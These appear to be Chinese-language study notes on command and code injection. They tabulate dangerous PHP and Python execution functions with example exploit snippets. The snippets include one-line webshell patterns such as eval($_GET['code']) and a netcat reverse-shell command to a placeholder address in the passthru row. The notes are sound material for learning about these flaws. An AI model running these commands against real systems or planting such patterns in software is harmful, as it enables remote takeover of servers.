命令执行

对象：操作系统命令

攻击者通过漏洞，让目标系统执行未授权的命令，最终达到控制目标、窃取数据等目的

  1. 危险的系统命令执行函数，例如 PHP 的 system()、exec()、shell_exec() 、passthru()、popen()或 Python 的 os.system()
  2. 输入的数据未被妥善隔离，而是被直接作为命令的一部分，拼接到待执行的命令字符串中
  3. 未对特殊字符（如管道符 |、分号 ;、命令分隔符）进行转义或过滤，导致恶意指令被成功注入

PHP 命令执行核心函数

函数名 核心功能 安全风险说明 典型利用场景
system() 执行外部命令，并直接输出结果 直接执行系统命令，参数可控时可直接执行任意命令 system($_GET['cmd']); 直接 RCE
exec() 执行外部命令，返回结果最后一行 可通过第二个参数获取完整输出，参数可控即 RCE exec("ping ".$_GET['ip']); 命令拼接注入
shell_exec() 执行外部命令，以字符串返回全部输出 等价于反引号 ```，参数可控直接 RCE $output = shell_exec("ls ".$_GET['dir']);
passthru() 执行外部命令，原样输出二进制结果 常用于执行带输出的命令（如反弹 shell），参数可控即 RCE passthru("nc -e /bin/sh 1.1.1.1 443");
popen() 打开进程管道，执行命令并返回文件指针 可通过管道读写命令输出，参数可控即 RCE $handle = popen("id", "r");
proc_open() 执行命令并创建进程管道，支持更复杂的 IO 控制 功能极强，参数可控可实现任意命令执行、管道通信 复杂命令执行、无回显 RCE
pcntl_exec() 在当前进程空间执行指定程序 需 pcntl 扩展，参数可控可执行任意程序 Linux 环境下的命令执行
```（反引号） 执行反引号内的系统命令，返回输出 语法糖（更简洁的写法），等价于shell_exec()，极易被忽略 $output = whoami;
eval() 把字符串作为 PHP 代码执行 代码执行（非系统命令），参数可控可执行任意 PHP 代码 eval($_GET['code']); 一句话木马
assert() 检查断言是否为 FALSE，旧版本可执行代码 PHP < 7.0 中assert($str)可执行代码，存在 RCE 风险 旧版本 PHP 的代码注入
call_user_func() 调用第一个参数作为回调函数 若函数名 / 参数可控，可调用任意危险函数（如system） call_user_func("system", "id");
array_map() 将自定义函数作用到数组每个元素 可传入危险函数（如system）实现批量命令执行 array_map("system", array("id", "whoami"));
preg_replace() 正则搜索替换 PHP < 5.5 中使用/e修饰符时，会执行替换字符串中的 PHP 代码 preg_replace("/test/e", $_GET['code'], "test");

Python 命令执行核心函数

函数名 核心功能 安全风险说明 典型利用场景
os.system() 执行系统命令，返回退出状态码 直接执行命令，无输出捕获，参数可控即 RCE os.system("whoami")
os.popen() 执行命令并返回文件对象，可读取输出 可获取命令完整输出，参数可控即 RCE output = os.popen("id").read()
subprocess.run() 推荐的子进程执行函数，支持复杂参数 功能极强，shell=True时参数可控可直接 RCE subprocess.run("id", shell=True)
subprocess.Popen() 更底层的子进程创建函数，支持管道 可实现无回显 RCE、反弹 shell，参数可控即 RCE 复杂命令执行、提权
commands.getstatusoutput() 执行命令，返回状态码 + 输出 Python 2 常用，等价于os.popen，参数可控即 RCE Python 2 环境的命令执行
eval() 执行字符串形式的 Python 表达式 代码执行，参数可控可执行任意 Python 代码 eval("__import__('os').system('id')")
exec() 执行动态生成的 Python 代码 功能比eval更强，可执行多行代码，参数可控即 RCE exec("import os; os.system('id')")

代码执行

对象：编程语言代码

「任意代码执行 (Arbitrary Code Execution,ACE)」 是指攻击者在目标计算机或目标进程中运行攻击者选择的任何命令或代码的能力，这是一个广泛的概念，它涵盖了任何类型的代码运行过程，不仅包括系统层面的脚本或程序，也包括应用程序内部的函数或方法调用。
在此基础上我们将通过网络触发任意代码执行的能力通常称为 「远程代码执行 (RCE,Remote Code Execution,RCE)」。

程序错误地将不可信的用户输入当作“合法代码”执行，导致攻击者能够注入并运行恶意代码

  1. 存在可执行动态代码的危险函数，例如PHP的eval()、assert()或Python的exec()
  2. 用户的输入数据未被净化，直接进入了代码执行流程，成为了执行代码的一部分
  3. 程序未对用户输入进行严格的检查、转义或过滤，允许包含恶意代码的负载注入

常见：

函数名 功能与安全风险说明
assert() 检查一个断言是否为 FALSE，旧版本中可执行代码，存在安全隐患。
call_user_func() 把第一个参数作为回调函数调用，若参数可控则可能导致代码注入。
array_map() 将用户自定义函数作用到数组中的每个值上，滥用可能导致批量执行。
preg_replace() 执行正则表达式搜索和替换，当使用 /e 修饰符时允许代码执行。
